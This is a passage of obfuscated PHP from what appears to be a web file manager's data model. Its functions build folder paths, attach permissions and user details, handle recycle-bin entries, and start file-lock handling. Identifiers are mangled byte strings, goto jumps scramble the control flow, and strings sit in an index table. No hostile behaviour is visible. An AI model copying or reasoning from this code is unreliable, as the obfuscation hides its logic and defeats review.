Bìò»®Í; EØÛÛÃê„Â: $BÙÅãÇ«”“ =& $_SERVER[Ü˜]; $B·ˆ†ó±‚Ø = array_to_keyvalue($fÏÒõİ–ó, $BÙÅãÇ«”“[33], $BÙÅãÇ«”“[456]); $B·ˆ†ó±‚Ø = array_filter(array_unique($B·ˆ†ó±‚Ø)); goto D°ÒßÀ½ôÛ; FËÄÖ“¥—¶: $Fß¦Ä¾¨«Œ = $Fß¦Ä¾¨«Œ ? $Fß¦Ä¾¨«Œ : array(); $bì­¢šÎÍä = array(); foreach ($Fß¦Ä¾¨«Œ as $C»­Ü­ƒá) { if (!isset($bì­¢šÎÍä[$C»­Ü­ƒá[$BÙÅãÇ«”“[456]]])) { $bì­¢šÎÍä[$C»­Ü­ƒá[$BÙÅãÇ«”“[456]]] = array(); } $bì­¢šÎÍä[$C»­Ü­ƒá[$BÙÅãÇ«”“[456]]][$C»­Ü­ƒá[$BÙÅãÇ«”“[103]]] = $C»­Ü­ƒá[$BÙÅãÇ«”“[381]]; } goto eè‰Ò˜šä¼; Bìò»®Í: $fó¿¡ÃŞ¼° = Model($BÙÅãÇ«”“[459])->field($cœƒ“à§†…)->where($a‰ˆãêåõô)->select(); $fó¿¡ÃŞ¼° = array_to_keyvalue($fó¿¡ÃŞ¼°, $BÙÅãÇ«”“[456]); $Fß¦Ä¾¨«Œ = Model($BÙÅãÇ«”“[460])->field($BÙÅãÇ«”“[461])->where($a‰ˆãêåõô)->select(); goto FËÄÖ“¥—¶; c Ÿ‚êÛÈ: } protected function _listAppendSourceInfo(&$f£×‹ø¸ä˜, $AôæÁ‹Ú›) { goto D‹Ÿ¿ô‚®ç; CêºÆ°¸øƒ: $b‹æÈ†©…¤ = Model($C–Æë­¬ÛÓ[427])->listData(); $Fã”æÒ¬¶Õ = Model($C–Æë­¬ÛÓ[417])->listData(); $AèÄÃÖ¸ = Model($C–Æë­¬ÛÓ[465])->listSimple(); goto Dì°£‘‰‡ë; C¯ö®ã±ôğ: $f‡ç ‚ÉïĞ = array_to_keyvalue_group($AèÄÃÖ¸, $C–Æë­¬ÛÓ[404]); foreach ($f£×‹ø¸ä˜ as &$d»‡Ú“‰®) { $d»‡Ú“‰®[$C–Æë­¬ÛÓ[95]] = array($C–Æë­¬ÛÓ[466] => 0, $C–Æë­¬ÛÓ[467] => 0, $C–Æë­¬ÛÓ[468] => 0); if (isset($dõ¬»Œ„œ[$d»‡Ú“‰®[$C–Æë­¬ÛÓ[404]]])) { $d»‡Ú“‰®[$C–Æë­¬ÛÓ[95]][$C–Æë­¬ÛÓ[469]] = 1; $d»‡Ú“‰®[$C–Æë­¬ÛÓ[95]][$C–Æë­¬ÛÓ[470]] = $dõ¬»Œ„œ[$d»‡Ú“‰®[$C–Æë­¬ÛÓ[404]]][$C–Æë­¬ÛÓ[28]]; } if (isset($a¦Œ»ã°ğÂ[$d»‡Ú“‰®[$C–Æë­¬ÛÓ[404]]])) { $d»‡Ú“‰®[$C–Æë­¬ÛÓ[95]][$C–Æë­¬ÛÓ[471]] = array(); foreach ($a¦Œ»ã°ğÂ[$d»‡Ú“‰®[$C–Æë­¬ÛÓ[404]]] as $fáÄ‹¸Ø¿Œ) { $F²Ú‚‚Î‚¬ = $CÌ¿ÇïÉÔ[$fáÄ‹¸Ø¿Œ]; $d»‡Ú“‰®[$C–Æë­¬ÛÓ[95]][$C–Æë­¬ÛÓ[471]][] = array($C–Æë­¬ÛÓ[472] => $F²Ú‚‚Î‚¬[$C–Æë­¬ÛÓ[402]], $C–Æë­¬ÛÓ[422] => $F²Ú‚‚Î‚¬[$C–Æë­¬ÛÓ[28]], $C–Æë­¬ÛÓ[473] => $F²Ú‚‚Î‚¬[$C–Æë­¬ÛÓ[474]]); } } if (isset($f‡ç ‚ÉïĞ[$d»‡Ú“‰®[$C–Æë­¬ÛÓ[404]]])) { $d»‡Ú“‰®[$C–Æë­¬ÛÓ[95]][$C–Æë­¬ÛÓ[475]] = array(); foreach ($f‡ç ‚ÉïĞ[$d»‡Ú“‰®[$C–Æë­¬ÛÓ[404]]] as $E¸ğöØ»ö) { $d»‡Ú“‰®[$C–Æë­¬ÛÓ[95]][$C–Æë­¬ÛÓ[475]] = array($C–Æë­¬ÛÓ[476] => $E¸ğöØ»ö[$C–Æë­¬ÛÓ[477]], $C–Æë­¬ÛÓ[478] => $E¸ğöØ»ö[$C–Æë­¬ÛÓ[479]], $C–Æë­¬ÛÓ[480] => $E¸ğöØ»ö[$C–Æë­¬ÛÓ[404]], $C–Æë­¬ÛÓ[481] => $E¸ğöØ»ö[$C–Æë­¬ÛÓ[482]], $C–Æë­¬ÛÓ[483] => $E¸ğöØ»ö[$C–Æë­¬ÛÓ[484]], $C–Æë­¬ÛÓ[485] => $E¸ğöØ»ö[$C–Æë­¬ÛÓ[485]], $C–Æë­¬ÛÓ[486] => $E¸ğöØ»ö[$C–Æë­¬ÛÓ[486]]); } } } unset($d»‡Ú“‰®); goto E‚‚™ğ¢‚; D‹Ÿ¿ô‚®ç: $C–Æë­¬ÛÓ =& $_SERVER[Ü˜]; if (!defined($C–Æë­¬ÛÓ[463])) { return; } $FŒ¤«Ñ¾¬ô = Model($C–Æë­¬ÛÓ[464])->listData(); goto CêºÆ°¸øƒ; Dì°£‘‰‡ë: $CÌ¿ÇïÉÔ = array_to_keyvalue($FŒ¤«Ñ¾¬ô, $C–Æë­¬ÛÓ[402]); $a¦Œ»ã°ğÂ = array_to_keyvalue_group($b‹æÈ†©…¤, $C–Æë­¬ÛÓ[86], $C–Æë­¬ÛÓ[428]); $dõ¬»Œ„œ = array_to_keyvalue($Fã”æÒ¬¶Õ, $C–Æë­¬ÛÓ[86]); goto C¯ö®ã±ôğ; E‚‚™ğ¢‚: return $f£×‹ø¸ä˜; goto F‚¢Š¢±‡Â; F‚¢Š¢±‡Â: } protected function _listAppendChildren(&$a´Ø‚¥ƒö, $e©ËÚ…øÇ›) { goto bÉ«¦¾»Ê; Cë¥î¡…í‘: foreach ($a´Ø‚¥ƒö as &$a¶ëë‹„“Â) { if (!$a¶ëë‹„“Â[$EªÙÊ®Œò®[412]]) { continue; } $FÏ«‘µº­˜[] = $a¶ëë‹„“Â[$EªÙÊ®Œò®[404]]; } unset($a¶ëë‹„“Â); if (!$FÏ«‘µº­˜) { return; } goto D¨ÓŸ‡ÅËÔ; bÉ«¦¾»Ê: $EªÙÊ®Œò® =& $_SERVER[Ü˜]; $FÏ«‘µº­˜ = array(); $B±…å¸‘– = array($EªÙÊ®Œò®[213] => 0, $EªÙÊ®Œò®[214] => 0); goto Cë¥î¡…í‘; EĞŒ‡¢‰Èº: unset($a¶ëë‹„“Â); goto DãÏ‚Ò‡‹; D¨ÓŸ‡ÅËÔ: $b¤•ï¤öÂ÷ = array($EªÙÊ®Œò®[487] => array($EªÙÊ®Œò®[7], $FÏ«‘µº­˜)); $B ®öêõÙÀ = array($EªÙÊ®Œò®[487], $EªÙÊ®Œò®[412], $EªÙÊ®Œò®[488] => $EªÙÊ®Œò®[489]); $C›ÚäŞå÷ò = $this->field($B ®öêõÙÀ)->where($b¤•ï¤öÂ÷)->group($EªÙÊ®Œò®[490])->select(); goto aãï›ÊËîÜ; aãï›ÊËîÜ: $D—ĞÒ‰–•ƒ = array(); foreach ($C›ÚäŞå÷ò as $Bˆ°ø‘öˆñ) { $Aæ¤Œ†à¬¦ = $Bˆ°ø‘öˆñ[$EªÙÊ®Œò®[487]]; $Fùé™‚áœ  = $Bˆ°ø‘öˆñ[$EªÙÊ®Œò®[412]] == $EªÙÊ®Œò®[97] ? $EªÙÊ®Œò®[214] : $EªÙÊ®Œò®[213]; if (!isset($D—ĞÒ‰–•ƒ[$Aæ¤Œ†à¬¦])) { $D—ĞÒ‰–•ƒ[$Aæ¤Œ†à¬¦] = array($EªÙÊ®Œò®[213] => 0, $EªÙÊ®Œò®[214] => 0); } $D—ĞÒ‰–•ƒ[$Aæ¤Œ†à¬¦][$Fùé™‚áœ ] += $Bˆ°ø‘öˆñ[$EªÙÊ®Œò®[489]]; } foreach ($a´Ø‚¥ƒö as &$a¶ëë‹„“Â) { if (!$a¶ëë‹„“Â[$EªÙÊ®Œò®[412]]) { continue; } $aé”Ğ¡”ƒ» = is_array($D—ĞÒ‰–•ƒ[$a¶ëë‹„“Â[$EªÙÊ®Œò®[404]]]) ? $D—ĞÒ‰–•ƒ[$a¶ëë‹„“Â[$EªÙÊ®Œò®[404]]] : $B±…å¸‘–; $a¶ëë‹„“Â[$EªÙÊ®Œò®[214]] = $aé”Ğ¡”ƒ»[$EªÙÊ®Œò®[214]]; $a¶ëë‹„“Â[$EªÙÊ®Œò®[213]] = $aé”Ğ¡”ƒ»[$EªÙÊ®Œò®[213]]; unset($a¶ëë‹„“Â[$EªÙÊ®Œò®[414]]); } goto EĞŒ‡¢‰Èº; DãÏ‚Ò‡‹: } protected function _listAppendAuth(&$C»ÓçÓŒË) { goto E”·œÌöÛ; EÂ§ƒ“œñÒ: $FãŠÀ¿‚¼ = Model($e£÷×‰ª—[491])->getSourceList($fÑ¶¼æÈ›, $C®÷ù©®©‹); foreach ($C»ÓçÓŒË as $eØË¬Í•™í => &$cªì—ñší´) { $cªì—ñší´[$e£÷×‰ª—[415]] = $FãŠÀ¿‚¼[$cªì—ñší´[$e£÷×‰ª—[404]]]; if (!$cªì—ñší´[$e£÷×‰ª—[415]] && $cªì—ñší´[$e£÷×‰ª—[413]] == self::TYPE_GROUP) { $cªì—ñší´[$e£÷×‰ª—[415]] = Action($e£÷×‰ª—[492])->pathGroupAuthMake($cªì—ñší´[$e£÷×‰ª—[493]]); if (!$cªì—ñší´[$e£÷×‰ª—[415]] && !_get($GLOBALS, $e£÷×‰ª—[494])) { $cªì—ñší´[$e£÷×‰ª—[206]] = !1; $cªì—ñší´[$e£÷×‰ª—[205]] = !1; } } if ($cªì—ñší´[$e£÷×‰ª—[415]]) { $cªì—ñší´[$e£÷×‰ª—[206]] = AuthModel::authCheckEdit($cªì—ñší´[$e£÷×‰ª—[415]][$e£÷×‰ª—[416]]); $cªì—ñší´[$e£÷×‰ª—[205]] = AuthModel::authCheckView($cªì—ñší´[$e£÷×‰ª—[415]][$e£÷×‰ª—[416]]); } $this->groupPathDisplay($cªì—ñší´); } unset($cªì—ñší´); goto cï¶Ğ×‘ñ¹; E”·œÌöÛ: $e£÷×‰ª— =& $_SERVER[Ü˜]; if (!defined($e£÷×‰ª—[463])) { return; } $fÑ¶¼æÈ› = array(); goto eì”’àÕš°; eì”’àÕš°: foreach ($C»ÓçÓŒË as $cªì—ñší´) { if ($cªì—ñší´[$e£÷×‰ª—[413]] == self::TYPE_GROUP) { $fÑ¶¼æÈ›[] = $cªì—ñší´[$e£÷×‰ª—[404]]; } } if (!$fÑ¶¼æÈ›) { return; } $C®÷ù©®©‹ = array_to_keyvalue($C»ÓçÓŒË, $e£÷×‰ª—[404]); goto EÂ§ƒ“œñÒ; cï¶Ğ×‘ñ¹: } public function groupPathDisplay(&$f«Åùíƒ¿Ğ) { goto AŒö·ÜÀà‹; D›ğÜö¦ÂÒ: $FÈÛ†œÌÙÊ = $this->parentLevelArray($dÈßĞ¬ïµ[$A˜¹¹Ôµã’[496]]); $B²è×¦¯¹ = $A˜¹¹Ôµã’[33]; foreach ($FÈÛ†œÌÙÊ as $a·Ó×˜âÚÃ) { $bÚÄÊ™ÍÑ¯ = Model($A˜¹¹Ôµã’[495])->getInfo($a·Ó×˜âÚÃ); $B²è×¦¯¹ .= $bÚÄÊ™ÍÑ¯[$A˜¹¹Ôµã’[95]][$A˜¹¹Ôµã’[404]] . $A˜¹¹Ôµã’[47]; } goto C‹–ÆÌÄĞå; AŒö·ÜÀà‹: $A˜¹¹Ôµã’ =& $_SERVER[Ü˜]; if ($f«Åùíƒ¿Ğ[$A˜¹¹Ôµã’[413]] != self::TYPE_GROUP) { return; } $dÈßĞ¬ïµ = Model($A˜¹¹Ôµã’[495])->getInfo($f«Åùíƒ¿Ğ[$A˜¹¹Ôµã’[493]]); goto D›ğÜö¦ÂÒ; C‹–ÆÌÄĞå: $f«Åùíƒ¿Ğ[$A˜¹¹Ôµã’[497]] = $dÈßĞ¬ïµ[$A˜¹¹Ôµã’[487]]; $f«Åùíƒ¿Ğ[$A˜¹¹Ôµã’[498]] = $dÈßĞ¬ïµ[$A˜¹¹Ôµã’[496]]; $f«Åùíƒ¿Ğ[$A˜¹¹Ôµã’[499]] = $dÈßĞ¬ïµ[$A˜¹¹Ôµã’[500]]; goto cùª‚ÇÎí; cùª‚ÇÎí: $f«Åùíƒ¿Ğ[$A˜¹¹Ôµã’[501]] = $B²è×¦¯¹ . $dÈßĞ¬ïµ[$A˜¹¹Ôµã’[95]][$A˜¹¹Ôµã’[404]]; goto aİÏŒ©œÙè; aİÏŒ©œÙè: } protected function _listAppendPath(&$b¶–¥¤ÂÀÕ) { goto BÅŠ†Û¡…Œ; B¬ÀøÕ ¦: $cŠŒÖù§õ = array_unique($cŠŒÖù§õ); if (count($cŠŒÖù§õ) > 0) { $A¯ÂÜ‚ãœ = array($b¡ªë[419] => array($b¡ªë[420], $cŠŒÖù§õ)); if (count($cŠŒÖù§õ) == 1) { $b´™ù¶øŸ = $this->sourceInfo($cŠŒÖù§õ[0]); $bï¾ÑÈáœ¦ = is_array($b´™ù¶øŸ) ? array($b´™ù¶øŸ) : !1; } else { $bï¾ÑÈáœ¦ = $this->field($b¡ªë[502])->where($A¯ÂÜ‚ãœ)->select(); } if (!$bï¾ÑÈáœ¦) { $bï¾ÑÈáœ¦ = array(); } foreach ($bï¾ÑÈáœ¦ as $A¥òÁÉÜ‘) { $fÔÕ…éº‹ƒ[$A¥òÁÉÜ‘[$b¡ªë[404]]] = $A¥òÁÉÜ‘[$b¡ªë[28]]; } } $Dù¬”Ñ˜á = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto a¬¯¸¡ƒğ‚; B‚ìöš·Š²: $E„ô‹Ÿ§×™ = array(); foreach ($b¶–¥¤ÂÀÕ as &$a÷ËŞäÒ–‹) { $e¹„µŠ•íø = $a÷ËŞäÒ–‹[$b¡ªë[412]] == $b¡ªë[97]; if ($e¹„µŠ•íø) { $fÔÕ…éº‹ƒ[$a÷ËŞäÒ–‹[$b¡ªë[404]]] = $a÷ËŞäÒ–‹[$b¡ªë[28]]; } if (isset($E„ô‹Ÿ§×™[$a÷ËŞäÒ–‹[$b¡ªë[496]]])) { continue; } $E„ô‹Ÿ§×™[$a÷ËŞäÒ–‹[$b¡ªë[496]]] = !0; $DçÌ„èé†Ÿ = $this->parentLevelArray($a÷ËŞäÒ–‹[$b¡ªë[496]]); foreach ($DçÌ„èé†Ÿ as $Fíİé¶†½÷ => $Aõà¨‰­Ö™) { if ($Fíİé¶†½÷ != 0 && !isset($fÔÕ…éº‹ƒ[$Aõà¨‰­Ö™])) { $cŠŒÖù§õ[] = $Aõà¨‰­Ö™; } } } unset($a÷ËŞäÒ–‹); goto B¬ÀøÕ ¦; Dòì×º¯›Ü: unset($a÷ËŞäÒ–‹); return $b¶–¥¤ÂÀÕ; goto CãôÍëéÖØ; a¬¯¸¡ƒğ‚: $a™¡âß…†ë = array(); $D ø©õô›à = array(); foreach ($b¶–¥¤ÂÀÕ as &$a÷ËŞäÒ–‹) { goto eã…¼Ì¹Ç; eã…¼Ì¹Ç: $CíùÓÄÜİ = $a÷ËŞäÒ–‹[$b¡ªë[496]]; if (isset($D ø©õô›à[$CíùÓÄÜİ])) { $CÜæŠ¾»®˜ = $a™¡âß…†ë[$CíùÓÄÜİ]; } else { $DçÌ„èé†Ÿ = $this->parentLevelArray($a÷ËŞäÒ–‹[$b¡ªë[496]]); $AÓ‹ØŠ¸›ä = $b¡ªë[503] . $a÷ËŞäÒ–‹[$b¡ªë[413]] . $b¡ªë[449] . $a÷ËŞäÒ–‹[$b¡ªë[493]]; if ($a™¡âß…†ë[$AÓ‹ØŠ¸›ä]) { $CÜæŠ¾»®˜ = $a™¡âß…†ë[$AÓ‹ØŠ¸›ä]; } else { $CÜæŠ¾»®˜ = $this->_listAppendPathRoot($a÷ËŞäÒ–‹, $DçÌ„èé†Ÿ); $a™¡âß…†ë[$AÓ‹ØŠ¸›ä] = $CÜæŠ¾»®˜; } foreach ($DçÌ„èé†Ÿ as $Fíİé¶†½÷ => $Aõà¨‰­Ö™) { if ($Fíİé¶†½÷ == 0 && $CÜæŠ¾»®˜ && $a÷ËŞäÒ–‹[$b¡ªë[413]] == self::TYPE_GROUP) { continue; } if (isset($fÔÕ…éº‹ƒ[$Aõà¨‰­Ö™])) { $CÜæŠ¾»®˜ .= $fÔÕ…éº‹ƒ[$Aõà¨‰­Ö™] . $b¡ªë[8]; } } if ($DçÌ„èé†Ÿ) { $CÜæŠ¾»®˜ .= $a÷ËŞäÒ–‹[$b¡ªë[28]]; } $a™¡âß…†ë[$CíùÓÄÜİ] = $CÜæŠ¾»®˜; } if ($a÷ËŞäÒ–‹[$b¡ªë[412]]) { $CÜæŠ¾»®˜ .= $b¡ªë[8]; } goto a­‘öáÒ; D†“ÎÉã: if (intval($a÷ËŞäÒ–‹[$b¡ªë[413]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($a÷ËŞäÒ–‹, $DçÌ„èé†Ÿ, $Dù¬”Ñ˜á); } goto DåŸóá¿è; a­‘öáÒ: $a÷ËŞäÒ–‹[$b¡ªë[504]] = str_replace($b¡ªë[505], $b¡ªë[8], $CÜæŠ¾»®˜); $FÓ‰ŞÅ—öø = trim($a÷ËŞäÒ–‹[$b¡ªë[504]], $b¡ªë[8]); if ($a÷ËŞäÒ–‹[$b¡ªë[487]] == $b¡ªë[201] && $FÓ‰ŞÅ—öø) { $a÷ËŞäÒ–‹[$b¡ªë[28]] = $FÓ‰ŞÅ—öø; } goto D†“ÎÉã; DåŸóá¿è: } goto Dòì×º¯›Ü; BÅŠ†Û¡…Œ: $b¡ªë =& $_SERVER[Ü˜]; static $fÔÕ…éº‹ƒ = array(); $cŠŒÖù§õ = array(); goto B‚ìöš·Š²; CãôÍëéÖØ: } private function _listAppendPathRecycle(&$d™Üˆë, $dºŸÕ·Õ˜, $DÍ•–Êó•˜) { goto aË²¹«À×·; E”ùæÁ•±Ÿ: $cíÔØõ¯Ë¯ = implode($D…šÊ°Â‹è[8], array_slice($DÛ¾„‡Ôµº, 2)); $d™Üˆë[$D…šÊ°Â‹è[504]] = $D…šÊ°Â‹è[8] . LNG($D…šÊ°Â‹è[506]) . $D…šÊ°Â‹è[8] . ltrim($cíÔØõ¯Ë¯, $D…šÊ°Â‹è[8]); $d™Üˆë[$D…šÊ°Â‹è[496]] = $D…šÊ°Â‹è[507] . implode($D…šÊ°Â‹è[47], array_slice($dºŸÕ·Õ˜, 1)) . $D…šÊ°Â‹è[47]; goto d‘›ª·—‰º; aË²¹«À×·: $D…šÊ°Â‹è =& $_SERVER[Ü˜]; if (!in_array($DÍ•–Êó•˜, $dºŸÕ·Õ˜) && $d™Üˆë[$D…šÊ°Â‹è[404]] != $DÍ•–Êó•˜) { return; } $DÛ¾„‡Ôµº = explode($D…šÊ°Â‹è[8], trim($d™Üˆë[$D…šÊ°Â‹è[504]], $D…šÊ°Â‹è[8])); goto E”ùæÁ•±Ÿ; d‘›ª·—‰º: if ($d™Üˆë[$D…šÊ°Â‹è[404]] == $DÍ•–Êó•˜) { $d™Üˆë[$D…šÊ°Â‹è[496]] = $D…šÊ°Â‹è[507]; $d™Üˆë[$D…šÊ°Â‹è[487]] = $D…šÊ°Â‹è[201]; $d™Üˆë[$D…šÊ°Â‹è[28]] = LNG($D…šÊ°Â‹è[506]); } $d™Üˆë[$D…šÊ°Â‹è[508]] = $D…šÊ°Â‹è[509]; goto A÷ó†•—; A÷ó†•—: } protected function _listAppendPathRoot(&$Aëö‰ñ®, $f¥¹ó«õ³) { $A…‰×’õ¼ =& $_SERVER[Ü˜]; $BÄô¡’÷–™ = $A…‰×’õ¼[33]; if ($Aëö‰ñ®[$A…‰×’õ¼[413]] == self::TYPE_USER) { if (defined($A…‰×’õ¼[463]) && $Aëö‰ñ®[$A…‰×’õ¼[493]] == USER_ID) { $BÄô¡’÷–™ = LNG($A…‰×’õ¼[510]); if (!$f¥¹ó«õ³) { $Aëö‰ñ®[$A…‰×’õ¼[28]] = $BÄô¡’÷–™; } } else { $E¤ÒÅÂéŒ = Model($A…‰×’õ¼[511])->getInfoSimple($Aëö‰ñ®[$A…‰×’õ¼[493]]); $BÄô¡’÷–™ = LNG($A…‰×’õ¼[512]) . $A…‰×’õ¼[170] . $E¤ÒÅÂéŒ[$A…‰×’õ¼[28]] . $A…‰×’õ¼[513]; } } else { if ($Aëö‰ñ®[$A…‰×’õ¼[413]] == self::TYPE_GROUP) { $E¤ÒÅÂéŒ = Model($A…‰×’õ¼[495])->getInfoSimple($Aëö‰ñ®[$A…‰×’õ¼[493]]); $BÄô¡’÷–™ = $E¤ÒÅÂéŒ[$A…‰×’õ¼[28]]; } else { if ($Aëö‰ñ®[$A…‰×’õ¼[413]] == self::TYPE_SYSTEM) { $BÄô¡’÷–™ = $A…‰×’õ¼[514]; } } } $BÄô¡’÷–™ = $BÄô¡’÷–™ ? $A…‰×’õ¼[8] . $BÄô¡’÷–™ . $A…‰×’õ¼[8] : $A…‰×’õ¼[8]; return $BÄô¡’÷–™; } protected function _listAppendUser(&$eßñÒ­ÊÇ) { goto eÅ³ï÷Š÷ğ; f„Ñù„Ë¨®: $DÂøÜôÄéÜ = array_merge($D¶¤Ë§Õª¸, $Fê†º£˜ñ); $FçĞÏ§øœ… = Model($eŸ‰ä¼‚çÔ[515])->userListInfo($DÂøÜôÄéÜ); foreach ($eßñÒ­ÊÇ as &$bä·ÖİçÜæ) { $bÂÉÅé—Ò­ = $bä·ÖİçÜæ[$eŸ‰ä¼‚çÔ[441]]; $bä·ÖİçÜæ[$eŸ‰ä¼‚çÔ[441]] = $FçĞÏ§øœ…[$bÂÉÅé—Ò­] ? $FçĞÏ§øœ…[$bÂÉÅé—Ò­] : !1; $bÂÉÅé—Ò­ = $bä·ÖİçÜæ[$eŸ‰ä¼‚çÔ[443]]; $bä·ÖİçÜæ[$eŸ‰ä¼‚çÔ[443]] = $FçĞÏ§øœ…[$bÂÉÅé—Ò­] ? $FçĞÏ§øœ…[$bÂÉÅé—Ò­] : !1; if (isset($bä·ÖİçÜæ[$eŸ‰ä¼‚çÔ[454]]) && $bä·ÖİçÜæ[$eŸ‰ä¼‚çÔ[454]][$eŸ‰ä¼‚çÔ[516]]) { $CÅŒ¦µ„›î = $GLOBALS[$eŸ‰ä¼‚çÔ[6]][$eŸ‰ä¼‚çÔ[98]][$eŸ‰ä¼‚çÔ[517]]; if ($bä·ÖİçÜæ[$eŸ‰ä¼‚çÔ[454]][$eŸ‰ä¼‚çÔ[518]] <= time() - $CÅŒ¦µ„›î) { $this->metaSet($bä·ÖİçÜæ[$eŸ‰ä¼‚çÔ[404]], $eŸ‰ä¼‚çÔ[516], null); $this->metaSet($bä·ÖİçÜæ[$eŸ‰ä¼‚çÔ[404]], $eŸ‰ä¼‚çÔ[518], null); unset($bä·ÖİçÜæ[$eŸ‰ä¼‚çÔ[454]][$eŸ‰ä¼‚çÔ[516]]); continue; } $fî©³ÏîµŸ = $bä·ÖİçÜæ[$eŸ‰ä¼‚çÔ[454]][$eŸ‰ä¼‚çÔ[516]]; $bä·ÖİçÜæ[$eŸ‰ä¼‚çÔ[454]][$eŸ‰ä¼‚çÔ[519]] = Model($eŸ‰ä¼‚çÔ[515])->getInfoSimpleOuter($fî©³ÏîµŸ); } } goto aá²Ş‰°; aá²Ş‰°: unset($bä·ÖİçÜæ); goto cè‘Àï´¤Â; eÅ³ï÷Š÷ğ: $eŸ‰ä¼‚çÔ =& $_SERVER[Ü˜]; $D¶¤Ë§Õª¸ = array_to_keyvalue($eßñÒ­ÊÇ, $eŸ‰ä¼‚çÔ[33], $eŸ‰ä¼‚çÔ[441]); $Fê†º£˜ñ = array_to_keyvalue($eßñÒ­ÊÇ, $eŸ‰ä¼‚çÔ[33], $eŸ‰ä¼‚çÔ[443]); goto f„Ñù„Ë¨®; cè‘Àï´¤Â: } public function parentLevelArray($a‚ÄóÜ‰®”) { $AÁÄÆË–» =& $_SERVER[Ü˜]; $a‚ÄóÜ‰®” = explode($AÁÄÆË–»[47], trim($a‚ÄóÜ‰®”, $AÁÄÆË–»[47])); return array_remove_value($a‚ÄóÜ‰®”, $AÁÄÆË–»[201]); } public function listAll($bí¢×œÏ“‘) { goto b‘Ò²›óÂˆ; C¼Áñ·›¦: $Aá‡öà©Ç¹ = array_to_keyvalue($Aá‡öà©Ç¹, $BÀ¡ŠŸÑ¬È[404]); $F²İ¾¢‘İ² = "\x2f{$b“ïâÕ‘¥ò[$BÀ¡ŠŸÑ¬È[28]]}\57"; $F²İ¾¢‘İ² = $F²İ¾¢‘İ² == $BÀ¡ŠŸÑ¬È[505] ? $BÀ¡ŠŸÑ¬È[8] : $F²İ¾¢‘İ²; goto D¸ëêó„öİ; CŠˆ²š¿É£: $this->_listAppendAuth($Aá‡öà©Ç¹); $this->_listAppendUser($Aá‡öà©Ç¹); $this->_listAppendPath($Aá‡öà©Ç¹); goto C¼Áñ·›¦; b‘Ò²›óÂˆ: $BÀ¡ŠŸÑ¬È =& $_SERVER[Ü˜]; $b“ïâÕ‘¥ò = $this->sourceInfo($bí¢×œÏ“‘); $dÉ‘¨Í“ã = array($BÀ¡ŠŸÑ¬È[520] => array($BÀ¡ŠŸÑ¬È[521], $b“ïâÕ‘¥ò[$BÀ¡ŠŸÑ¬È[496]] . $bí¢×œÏ“‘ . $BÀ¡ŠŸÑ¬È[522]), $BÀ¡ŠŸÑ¬È[523] => 0); goto bˆ ª¥ôĞ; bˆ ª¥ôĞ: $A‰í´ñ¥ = $BÀ¡ŠŸÑ¬È[524]; $F“µ÷¬„¯ = "\114\x45\106\x54\x20\x4a\117\x49\116\x20{$this->tablePrefix}\151\x6f\x5f\x66\151\x6c\x65\x20\146\x69\x6c\x65\x20\x6f\x6e\x20\x73\x6f\x75\162\x63\x65\56\x66\151\x6c\145\x49\x44\x20\75\40\146\x69\x6c\x65\x2e\146\151\154\145\x49\x44"; $Aá‡öà©Ç¹ = $this->alias($BÀ¡ŠŸÑ¬È[525])->field($A‰í´ñ¥)->where($dÉ‘¨Í“ã)->join($F“µ÷¬„¯)->select(); goto CŠˆ²š¿É£; D¸ëêó„öİ: $e¡¸‹ÜÏò = array(); foreach ($Aá‡öà©Ç¹ as $a­´–Ë×Îğ => $eÎ²ˆ›¢¥Ÿ) { goto c¢ïÆö¢¼‘; fÅÓ¹¹æ‹¢: $b‡ÇÖî™‹ = str_replace($BÀ¡ŠŸÑ¬È[505], $BÀ¡ŠŸÑ¬È[8], $b‡ÇÖî™‹); $b‡ÇÖî™‹ = str_replace($BÀ¡ŠŸÑ¬È[505], $BÀ¡ŠŸÑ¬È[8], $b‡ÇÖî™‹); $BâËÎŠÀÉ = array($BÀ¡ŠŸÑ¬È[423] => str_replace($BÀ¡ŠŸÑ¬È[505], $BÀ¡ŠŸÑ¬È[8], $b‡ÇÖî™‹), $BÀ¡ŠŸÑ¬È[526] => intval($eÎ²ˆ›¢¥Ÿ[$BÀ¡ŠŸÑ¬È[412]]), $BÀ¡ŠŸÑ¬È[95] => $this->pathInfoFilter($eÎ²ˆ›¢¥Ÿ)); goto c¢Œ«Ÿâ™é; c¢ïÆö¢¼‘: $CÃŸèÛ¤„µ = $this->parentLevelArray($eÎ²ˆ›¢¥Ÿ[$BÀ¡ŠŸÑ¬È[496]]); array_shift($CÃŸèÛ¤„µ); $b‡ÇÖî™‹ = $F²İ¾¢‘İ²; goto aÛ·İÆ”†; aÛ·İÆ”†: for ($d‡ÍË³°‹® = 0; $d‡ÍË³°‹® < count($CÃŸèÛ¤„µ); $d‡ÍË³°‹®++) { $b‡ÇÖî™‹ .= $Aá‡öà©Ç¹[$CÃŸèÛ¤„µ[$d‡ÍË³°‹®]][$BÀ¡ŠŸÑ¬È[28]] . $BÀ¡ŠŸÑ¬È[8]; } $b‡ÇÖî™‹ .= $eÎ²ˆ›¢¥Ÿ[$BÀ¡ŠŸÑ¬È[28]]; if ($eÎ²ˆ›¢¥Ÿ[$BÀ¡ŠŸÑ¬È[412]]) { $b‡ÇÖî™‹ .= $BÀ¡ŠŸÑ¬È[8]; } goto fÅÓ¹¹æ‹¢; c¢Œ«Ÿâ™é: if (!$eÎ²ˆ›¢¥Ÿ[$BÀ¡ŠŸÑ¬È[412]]) { $BâËÎŠÀÉ[$BÀ¡ŠŸÑ¬È[456]] = $eÎ²ˆ›¢¥Ÿ[$BÀ¡ŠŸÑ¬È[456]]; $BâËÎŠÀÉ[$BÀ¡ŠŸÑ¬È[96]] = $eÎ²ˆ›¢¥Ÿ[$BÀ¡ŠŸÑ¬È[86]]; } $e¡¸‹ÜÏò[] = $BâËÎŠÀÉ; goto bÌ†ß „ö; bÌ†ß „ö: } return $e¡¸‹ÜÏò; goto B·Äğô…ÖÑ; B·Äğô…ÖÑ: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($b˜èÙŸ©¶Ê) { goto F²­›¸ßš°; F²­›¸ßš°: $C¢Şšã¾’ =& $_SERVER[Ü˜]; if (!$this->allowLock()) { return; } $this->_lockCheck($C¢Şšã¾’[527], $b˜èÙŸ©¶Ê); goto CÁÈ½á‘§; CÁÈ½á‘§: $E„·ÓÀ›ŒÇ = 1; $this->_lockEvent($b˜èÙŸ©¶Ê, array($C¢Şšã¾’[528], $C¢Şšã¾’[529]), 